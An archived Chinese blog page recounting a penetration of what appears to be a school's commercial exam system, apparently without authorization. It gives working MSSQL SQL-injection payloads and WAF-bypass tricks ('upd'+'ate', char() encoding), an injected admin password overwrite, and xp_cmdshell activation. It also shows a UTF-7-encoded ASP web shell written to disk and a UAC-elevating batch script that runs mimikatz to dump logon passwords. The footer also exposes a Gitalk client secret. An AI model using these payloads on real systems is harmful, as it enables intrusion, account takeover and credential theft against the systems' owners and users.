<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <link rel="icon" href="data:;base64,=">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        leshier&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body id="bodyx">
    
<div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            「历史博客」- 记一次峰回路转的渗透测试
        </p>
        <hr>
    </div>

    <div class="post-content">
        <p><strong>按</strong></p>
<blockquote>
<p>这篇文章严格意义上说是我发的第一篇帖子，现如今的<code>waf</code>防御策略早已改变，肯定不能复现了。</p>
<p>但也是我第一次过狗的经验。</p>
<p>现在看起来，在<code>Pentest</code>中还是走了一些弯路，并不直接。</p>
</blockquote>
<h2 id="1-收集信息"><a href="#1-收集信息" class="headerlink" title="1. 收集信息"></a>1. 收集信息</h2><p><img src="/2018/09/02/Difficult-Pentest/image-20201220092612916.png" alt="image-20201220092612916"></p>
<p><code>aspx</code>  + <code> iis7.5</code> 的环境，那么首先看到iis7.5就想到解析漏洞了，目测没有<code>php</code>环境，解析漏洞是不可能滴。猜测数据库是<code>sqlserver</code>，当然在这里只是猜测，后面再继续看。然后这个考试系统应该是未开源的<code>cms</code>，搜索了一下这个<code>cms</code>的信息，网上450元一套。呵，估计老师为了偷懒买了一套这个系统来搭建的。那么我们先测试吧，前台我就不看了，因为我有账号，但是里面没有利用的点。看到图片下边的管理员登录了没？我们点进去看下。</p>
<h2 id="2-后台系统"><a href="#2-后台系统" class="headerlink" title="2. 后台系统"></a>2. 后台系统</h2><p><img src="/2018/09/02/Difficult-Pentest/image-20201220092711388.png" alt="image-20201220092711388"></p>
<p>这个框，原来测试过，有验证码，<code>sqlmap</code>注入是不可能的了，而且在我用<code>sqlmap</code>黑盒测试的时候，发现有<code>waf</code></p>
<p><img src="/2018/09/02/Difficult-Pentest/image-20201220092735497.png" alt="image-20201220092735497"></p>
<p>那咱们不能硬钢，等缓缓。手工测试一下。 <code>username</code> 那里我们输入 <code>payload </code></p>
<p><code>1&#39; or @@version&gt;0--1</code></p>
<p><img src="/2018/09/02/Difficult-Pentest/image-20201220092814277.png" alt="image-20201220092814277"></p>
<p>很好没有拦截成功报错  那么确定了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在将 nvarchar 值 &#x27;Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) Apr 2 2010 15:48:46 Copyright (c) Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor) &#x27; 转换成数据类型 int 时失败。</span><br></pre></td></tr></table></figure>

<p><code>mssql 2008</code>的。</p>
<p>竟然有注入，虽然有<code>waf</code>，那么我们考虑三种情况:</p>
<ul>
<li>进入后台，找上传点，<code>getshell</code>。</li>
<li>尝试开启<code>xp_cmdshell</code> 然后运行系统命令。</li>
<li>查看当前用户，尝试写<code>shell</code>。</li>
</ul>
<p>首先，我们知道有<code>waf</code>，这个<code>waf</code>虽然感觉版本比较老，但是如果操作太敏感，比如开启<code>xp_cmdshell</code>可能还是会拦截，我们知道上传<code>getshell</code>绕过<code>waf</code>比较多。那么我们尝试获取后台账号密码，然后找上传点。</p>
<h2 id="3-获取帐号密码"><a href="#3-获取帐号密码" class="headerlink" title="3. 获取帐号密码"></a>3. 获取帐号密码</h2><p><code>payload</code>:</p>
<p><code>1&#39; or User_Name()&gt;0--</code></p>
<p><code>在将 nvarchar 值 &#39;dbo&#39; 转换成数据类型 int 时失败。</code></p>
<p><code>dba</code>权限，嘿嘿，啥都别说，先获取库名，表名，字段名。 在这，我就直接上<code>payload</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> kaoshi.sys.all_objects <span class="keyword">where</span> <span class="keyword">type</span>=<span class="string">&#x27;U&#x27;</span> <span class="keyword">AND</span> is_ms_shipped=<span class="number">0</span> <span class="keyword">and</span> <span class="keyword">name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;jc_AutoSave&#x27;</span>,<span class="string">&#x27;jc_ErrorPaper&#x27;</span>,<span class="string">&#x27;jc_ExerciseLog&#x27;</span>,<span class="string">&#x27;jc_Library&#x27;</span>,<span class="string">&#x27;jc_LoginItem&#x27;</span>,<span class="string">&#x27;jc_Paper&#x27;</span>,<span class="string">&#x27;jc_Permissions&#x27;</span>,<span class="string">&#x27;jc_Subject&#x27;</span>,<span class="string">&#x27;jc_System&#x27;</span>,<span class="string">&#x27;jc_TestLog&#x27;</span>,<span class="string">&#x27;jc_Unit&#x27;</span>,<span class="string">&#x27;jc_User&#x27;</span>,<span class="string">&#x27;jc_UserGroup&#x27;</span>,<span class="string">&#x27;jc_Dbbak&#x27;</span>,<span class="string">&#x27;Tmp_jc_Paper&#x27;</span>,<span class="string">&#x27;Tmp_jc_User&#x27;</span>,<span class="string">&#x27;jc_Zsd&#x27;</span>))&gt;<span class="number">0</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>妈的，我以为在jc_User这个表里，但是经过测试发现，里面是前台用户数据。我直接猜测jc_admin</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or (<span class="keyword">select</span> top <span class="number">1</span> COLUMN_NAME <span class="keyword">from</span> kaoshi.information_schema.columns <span class="keyword">where</span> TABLE_NAME=<span class="string">&#x27;jc_Admin&#x27;</span>)&gt;<span class="number">0</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><img src="/2018/09/02/Difficult-Pentest/image-20201220093130228.png" alt="image-20201220093130228"></p>
<p>很好，不拦截，出现了ID。后面的操作我就不多说。直接获取<code>Adminusername</code>和<code>adminpassword</code>的值了。 一共获取了如下用户的账号密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">75F171870153XXXX5F83639829FFC6CD</span><br><span class="line">wjh </span><br><span class="line">009711AF72XXXX07F9E799D783578A15</span><br><span class="line">xxzx</span><br><span class="line">97549AF8121XXXX934C822A84EC9E809</span><br><span class="line">shenbo</span><br><span class="line">574849F13XXXXC0D178E1D9B0547434E</span><br></pre></td></tr></table></figure>

<p><code>admin</code>和<code>xxzx</code>的密码无法解出，其他的能解，尝试登陆。。。</p>
<p><img src="/2018/09/02/Difficult-Pentest/image-20201220093212311.png" alt="image-20201220093212311"></p>
<p>服务器的一些信息能获取。绝对路径D:\XXX\ 但是想点击数据库管理时，发现。没有权限。</p>
<p><img src="/2018/09/02/Difficult-Pentest/image-20201220093228975.png" alt="image-20201220093228975"></p>
<p>唯一的上传点就是这个<code>fck</code>编辑器，在<code>iis7.5</code>下，<code>getshell</code>基本没戏。天啦噜，难道，我无路可寻。。。</p>
<h2 id="4-修改密码"><a href="#4-修改密码" class="headerlink" title="4. 修改密码"></a>4. 修改密码</h2><p>在这里我抽了四根烟，仔细梳理一下，现在低权限的管理没有权限对数据库管理。那么<code>admin</code>的密码又无法解出。怎么办呢？？？？？</p>
<p>突然，初生牛犊不破虎，妈的，把<code>admin</code>的密码改掉。<code>update</code>注入尝试一下。最后后面获取了权限把密码在数据库那改回来。</p>
<p>构造</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">update</span> jc_Admin <span class="keyword">SeT</span> Adminpassword=<span class="string">&#x27;009711AF72XXXX07F9E799D783578A15&#x27;</span> <span class="keyword">WHERE</span> AdminUserName=<span class="string">&#x27;admin&#x27;</span>;<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>密码就用<code>wjh</code>用户的<code>md5</code>密码。</p>
<p><img src="/2018/09/02/Difficult-Pentest/image-20201220093345159.png" alt="image-20201220093345159"></p>
<p><img src="/2018/09/02/Difficult-Pentest/image-20201220093359192.png" alt="image-20201220093359192"></p>
<p>妈的，狗有时候就在你最不想让它出来的时候出来要你一口。</p>
<p>经过测试，过滤了<code>update</code>。<code>hex</code>编码不行。这是我想到用存储过程。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">execute</span>(<span class="string">&#x27;sql line&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>payload</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">execute</span>(<span class="string">&#x27;upd&#x27;</span>+<span class="string">&#x27;ate jc_Admin set Adminpassword= &#x27;</span><span class="number">009711</span>AF72XXXX07F9E799D783578A15<span class="string">&#x27; WHERE AdminUserName=&#x27;</span><span class="keyword">admin</span><span class="string">&#x27;&#x27;</span>);<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>把update拆开用+相连，嘿嘿，机制如我。</p>
<p><img src="/2018/09/02/Difficult-Pentest/image-20201220093502574.png" alt="image-20201220093502574"></p>
<p>语法错误，这里我想了一个晚上，按理来说是没有问题的，<code>waf</code>也不拦截了。但是就是语法错误。这里，我叫上我的数据库实验室的专家，我的好基友</p>
<p><img src="/2018/09/02/Difficult-Pentest/image-20201220093524968.png" alt="image-20201220093524968"></p>
<p>他一下来就帮我解决了这个问题。</p>
<p>原因是<code>excute(&#39;sql line&#39;)</code>中不能存在引号，那么，我们的语句咱们构造呢？</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">execute</span>(<span class="string">&#x27;upd&#x27;</span>+<span class="string">&#x27;ate jc_Admin set Adminpassword= char(48)+char(48)+char(57)+char(55)+char(49)+char(49)+char(65)+char(70)+char(55)+char(50)+char(50)+char(66)+char(51)+char(53)+char(48)+char(55)+char(70)+char(57)+char(69)+char(55)+char(57)+char(57)+char(68)+char(55)+char(56)+char(51)+char(53)+char(55)+char(49)+char(53) WHERE AdminUserName=char(55)+char(57)+char(57)+char(68));--</span></span><br></pre></td></tr></table></figure>

<p>用<code>char()</code> 哈哈，加号相连。（这里的数据我做了处理。知道原理就好了），同学们，你们看出来了吗？</p>
<p><code>Ok</code>这个<code>payload </code>过去，完美，成功修改。 登录看看。</p>
<p><img src="/2018/09/02/Difficult-Pentest/image-20201220093629550.png" alt="image-20201220093629550"></p>
<p>什么？？？你的数据库操作和我想象中的不一样啊，我不执行sql语句吗？？？备份？？？你为什么不直接写数据库备份？？？？欲哭无泪，好不容易登录进来，却是我不想要的结果。。。。</p>
<h2 id="5-柳暗花明"><a href="#5-柳暗花明" class="headerlink" title="5. 柳暗花明"></a>5. 柳暗花明</h2><p>但是<code>admin</code>登录进去还是有收获的。看到了mssql的密码，但是尝试连接，无法连接。没开外联。</p>
<p>那么，我又回到了起点。怎么搞。。</p>
<p>开<code>xp_cmdshell</code> 把。用<code>post</code>注入那丢<code>payload</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;EXEC sp_configure &#x27;<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">&#x27;,1;--</span></span><br><span class="line"><span class="string">&#x27;</span>;RECONFIGURE<span class="comment">--</span></span><br><span class="line">&#x27;;EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;<span class="comment">--</span></span><br><span class="line">&#x27;;RECONFIGURE;<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>前面提到，我们知道网站的物理路径，直接写shell。</p>
<p>在这感谢landGray大佬，</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;exec master..xp_cmdshell &#x27;echo ^&lt;%@codepage=65000%^&gt;^&lt;%+AHIAZQBzAHAAbwBuAHMAZQAuAGMAbwBkAGUAcABhAGcAZQA9ADYANQAwADAAMQA6AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBMAGEAbgBkAEcAcgBlAHkAIgApACk-%^&gt; &gt; D:\XXX\1.asp&#x27; ;--</span><br></pre></td></tr></table></figure>

<p>他的utf7 过狗很好用，感谢分享。</p>
<p><img src="/2018/09/02/Difficult-Pentest/image-20201220093741939.png" alt="image-20201220093741939"></p>
<p>get，直接连接数据库，用<code>mssql</code>的<code>xp_cmdshell</code>执行命令。</p>
<p><img src="/2018/09/02/Difficult-Pentest/image-20201220093754094.png" alt="image-20201220093754094"></p>
<p>嘎嘎嘎</p>
<p>系统权限，上传<code>mimikatz</code></p>
<p>为了防止回显的意外</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">&gt;nul <span class="number">2</span>&gt;&amp;<span class="number">1</span> <span class="string">&quot;%SYSTEMROOT%\system32\cacls.exe&quot;</span> <span class="string">&quot;%SYSTEMROOT%\system32\config\system&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="comment">&#x27;%errorlevel%&#x27; NEQ &#x27;0&#x27; (</span></span><br><span class="line"><span class="keyword">goto</span> UACPrompt</span><br><span class="line">) <span class="keyword">else</span> ( <span class="keyword">goto</span> gotAdmin )</span><br><span class="line">:UACPrompt</span><br><span class="line">echo <span class="keyword">Set</span> UAC = CreateObject^(<span class="string">&quot;Shell.Application&quot;</span>^) &gt; <span class="string">&quot;%temp%\getadmin.vbs&quot;</span></span><br><span class="line">echo UAC.ShellExecute <span class="string">&quot;%~s0&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;runas&quot;</span>, <span class="number">1</span> &gt;&gt; <span class="string">&quot;%temp%\getadmin.vbs&quot;</span></span><br><span class="line"><span class="string">&quot;%temp%\getadmin.vbs&quot;</span></span><br><span class="line"><span class="keyword">exit</span> /B</span><br><span class="line">:gotAdmin</span><br><span class="line"><span class="keyword">if</span> exist <span class="string">&quot;%temp%\getadmin.vbs&quot;</span> ( del <span class="string">&quot;%temp%\getadmin.vbs&quot;</span> )</span><br><span class="line">pushd <span class="string">&quot;%CD%&quot;</span></span><br><span class="line">CD /D <span class="string">&quot;%~dp0&quot;</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;&quot;</span>privilege::debug<span class="string">&quot;&quot;</span> <span class="string">&quot;&quot;</span>sekurlsa::logonpasswords full<span class="string">&quot;&quot;</span> <span class="keyword">exit</span> &gt;&gt; log.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2018/09/02/Difficult-Pentest/image-20201220093821371.png" alt="image-20201220093821371"></p>
<p><img src="/2018/09/02/Difficult-Pentest/image-20201220093833564.png" alt="image-20201220093833564"></p>

    </div>

    <div>
        
    <section>
      <div id="gitalk-container"></div>
    </section>

        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script type="text/javascript">
    var gitalk = new Gitalk({
        clientID: 'ed09c837cb5a287364c2',
        clientSecret: '772e6894e16520ef6e42a457144c463f11882870',
        repo: 'leshier.github.io',
        owner: 'leshier',
        admin: 'leshier',
        id: location.pathname,      // Ensure uniqueness and length less than 50
        distractionFreeMode: 'false'  // Facebook-like distraction free mode
    })
    gitalk.render('gitalk-container')
</script>
    </div>
</div>

    <div class="footer" id="footer">
    
        
<script src="/js/busuanzi.pure.mini.js"></script>

        <span id="busuanzi_container_site_pv">Site PV: <span id="busuanzi_value_site_pv"></span></span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv">Site UV: <span id="busuanzi_value_site_uv"></span></span>
    
    <p>Copyright © 2020 <a class="flink" href="#">Modified Geek by leshier</a>.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label>
        
    </p>
</div>
<input type="hidden" id="web_style" value="black"> 


<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>


<script src="/js/js.js"></script>


</body>

</html>